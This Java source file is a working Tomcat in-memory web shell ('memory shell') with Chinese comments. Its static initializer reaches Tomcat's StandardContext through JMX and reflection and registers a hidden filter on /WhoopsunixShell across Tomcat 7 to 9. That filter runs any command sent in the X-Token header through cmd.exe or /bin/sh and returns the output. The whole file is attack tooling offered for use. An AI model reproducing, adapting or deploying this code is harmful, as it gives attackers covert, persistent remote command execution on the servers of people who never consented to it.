package com.demo.memshell;

import com.sun.jmx.mbeanserver.NamedObject;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import java.io.InputStream;
import java.io.PrintWriter;
import java.lang.management.ManagementFactory;
import java.lang.reflect.Field;
import java.util.Set;

/**
 * @author Whoopsunix
 * JMX 获取 StandardContext 注入 Tomcat Filter 型内存马
 * Tomcat 7 8 9
 */
public class TomcatFilterJMXMS implements Filter {

    final private static String NAME = "Whoopsunix";
    final private static String pattern = "/WhoopsunixShell";

    public TomcatFilterJMXMS() {

    }

    static {
        try {
            // 获取 MBeanServer, 用于注册和管理 MBeans
            javax.management.MBeanServer mbeanServer = ManagementFactory.getPlatformMBeanServer();
//            javax.management.MBeanServer mbeanServer = org.apache.tomcat.util.modeler.Registry.getRegistry(null, null).getMBeanServer();
            // 获取 DefaultMBeanServerInterceptor, 用于处理 MBeanServer 的请求和操作
            com.sun.jmx.interceptor.DefaultMBeanServerInterceptor defaultMBeanServerInterceptor = (com.sun.jmx.interceptor.DefaultMBeanServerInterceptor) getFieldValue(mbeanServer, "mbsInterceptor");
            // 获取 Repository, 用于存储注册的 MBean
            com.sun.jmx.mbeanserver.Repository repository = (com.sun.jmx.mbeanserver.Repository) getFieldValue(defaultMBeanServerInterceptor, "repository");
            // 查询匹配指定条件的 MBean spring 和 tomcat 不同
            Set<NamedObject> objectSet = repository.query(new javax.management.ObjectName("Catalina:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);
            if (objectSet.size() == 0) {
                // springboot 中是 Tomcat
                objectSet = repository.query(new javax.management.ObjectName("Tomcat:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);
            }
            for (NamedObject namedObject : objectSet) {
                javax.management.DynamicMBean dynamicMBean = namedObject.getObject();
                org.apache.catalina.authenticator.AuthenticatorBase authenticatorBase = (org.apache.catalina.authenticator.AuthenticatorBase) getFieldValue(dynamicMBean, "resource");
                org.apache.catalina.core.StandardContext standardContext = (org.apache.catalina.core.StandardContext) getFieldValue(authenticatorBase, "context");

                Object filterDef = standardContext.getClass().getDeclaredMethod("findFilterDef", String.class).invoke(standardContext, NAME);

                if (filterDef != null) {
                    break;
                }
                TomcatFilterJMXMS filterMemShell = new TomcatFilterJMXMS();

                try {
                    // tomcat 7
                    // org.apache.catalina.deploy.FilterDef
                    // 添加 filterDef
                    filterDef = Class.forName("org.apache.catalina.deploy.FilterDef").newInstance();
                    filterDef.getClass().getDeclaredMethod("setFilterName", String.class).invoke(filterDef, NAME);
                    filterDef.getClass().getDeclaredMethod("setFilterClass", String.class).invoke(filterDef, filterMemShell.getClass().getName());
                    standardContext.getClass().getDeclaredMethod("addFilterDef", filterDef.getClass()).invoke(standardContext, filterDef);

                    // 添加 filterMap
                    Object filterMap = Class.forName("org.apache.catalina.deploy.FilterMap").newInstance();
                    filterMap.getClass().getDeclaredMethod("setFilterName", String.class).invoke(filterMap, NAME);
                    filterMap.getClass().getDeclaredMethod("addURLPattern", String.class).invoke(filterMap, pattern);
                    filterMap.getClass().getDeclaredMethod("setDispatcher", String.class).invoke(filterMap, "REQUEST");
                    standardContext.getClass().getDeclaredMethod("addFilterMap", filterMap.getClass()).invoke(standardContext, filterMap);

                    // 添加 filterConfig
                    java.util.Map filterConfigs = (java.util.Map) getFieldValue(standardContext, "filterConfigs");
                    java.lang.reflect.Constructor constructor = org.apache.catalina.core.ApplicationFilterConfig.class.getDeclaredConstructor(org.apache.catalina.Context.class, filterDef.getClass());
                    constructor.setAccessible(true);
                    org.apache.catalina.core.ApplicationFilterConfig filterConfig = (org.apache.catalina.core.ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
                    filterConfigs.put(NAME, filterConfig);
                } catch (ClassNotFoundException e) {
                    // tomcat 8 9
                    // org.apache.tomcat.util.descriptor.web.FilterDef
                    // 添加 filterDef
                    filterDef = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef").newInstance();
                    filterDef.getClass().getDeclaredMethod("setFilterName", String.class).invoke(filterDef, NAME);
                    filterDef.getClass().getDeclaredMethod("setFilterClass", String.class).invoke(filterDef, filterMemShell.getClass().getName());
                    filterDef.getClass().getDeclaredMethod("setFilter", Filter.class).invoke(filterDef, filterMemShell);
                    standardContext.getClass().getDeclaredMethod("addFilterDef", filterDef.getClass()).invoke(standardContext, filterDef);

                    // 添加 filterMap
                    Object filterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap").newInstance();
                    filterMap.getClass().getDeclaredMethod("setFilterName", String.class).invoke(filterMap, NAME);
                    filterMap.getClass().getDeclaredMethod("addURLPattern", String.class).invoke(filterMap, pattern);
                    filterMap.getClass().getDeclaredMethod("setDispatcher", String.class).invoke(filterMap, "REQUEST");
                    standardContext.getClass().getDeclaredMethod("addFilterMap", filterMap.getClass()).invoke(standardContext, filterMap);

                    // 添加 filterConfig
                    java.util.Map filterConfigs = (java.util.Map) getFieldValue(standardContext, "filterConfigs");
                    java.lang.reflect.Constructor constructor = org.apache.catalina.core.ApplicationFilterConfig.class.getDeclaredConstructor(org.apache.catalina.Context.class, filterDef.getClass());
                    constructor.setAccessible(true);
                    org.apache.catalina.core.ApplicationFilterConfig filterConfig = (org.apache.catalina.core.ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
                    filterConfigs.put(NAME, filterConfig);
                }

            }


        } catch (Exception e) {

        }
    }


    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) {
        try {
            HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest;
            String header = httpServletRequest.getHeader("X-Token");
            if (header == null) {
                return;
            }
            String result = exec(header);
            PrintWriter printWriter = servletResponse.getWriter();
            printWriter.println("TomcatFilterJMXMS injected");
            printWriter.println(result);
        } catch (Exception e) {

        }

    }

    @Override
    public void destroy() {

    }

    public static String exec(String str) {
        try {
            String[] cmd = null;
            if (System.getProperty("os.name").toLowerCase().contains("windows")) {
                cmd = new String[]{"cmd.exe", "/c", str};
            } else {
                cmd = new String[]{"/bin/sh", "-c", str};
            }
            if (cmd != null) {
                InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
                String execresult = exec_result(inputStream);
                return execresult;
            }
        } catch (Exception e) {

        }
        return "";
    }

    public static String exec_result(InputStream inputStream) {
        try {
            byte[] bytes = new byte[1024];
            int len = 0;
            StringBuilder stringBuilder = new StringBuilder();
            while ((len = inputStream.read(bytes)) != -1) {
                stringBuilder.append(new String(bytes, 0, len));
            }
            return stringBuilder.toString();
        } catch (Exception e) {
            return "";
        }
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

}
